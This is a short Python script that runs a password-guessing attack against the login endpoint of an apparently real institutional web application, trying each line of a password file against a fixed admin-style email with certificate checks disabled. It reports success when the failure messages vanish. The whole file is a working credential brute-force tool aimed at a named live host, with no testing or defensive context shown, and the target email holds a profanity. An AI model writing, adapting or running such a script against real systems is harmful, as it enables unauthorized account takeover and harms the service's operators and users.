import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://internalapp.nptel.ac.in/B2C/"
LOGIN_URL = "https://internalapp.nptel.ac.in/B2C/validate.php"

session = requests.Session()

# Open login page first
session.get(BASE_URL, verify=False)

email = "admin@fuckyouuniversity.ac.in"

with open("passwords.txt", "r") as file:

    for password in file:
        password = password.strip()

        data = {
            "emailid": email,
            "password": password
        }

        response = session.post(
            LOGIN_URL,
            data=data,
            verify=False,
            allow_redirects=True
        )

        print(f"Trying: {password}")
        print("Final URL:", response.url)

        text = response.text.lower()

        # FAILED LOGIN
        if (
            "sorry" in text
            or "does not exists" in text
            or "logout.php" in response.url
        ):

            print("[-] Wrong Password\n")

        else:
            print(f"[+] PASSWORD FOUND: {password}")
            break
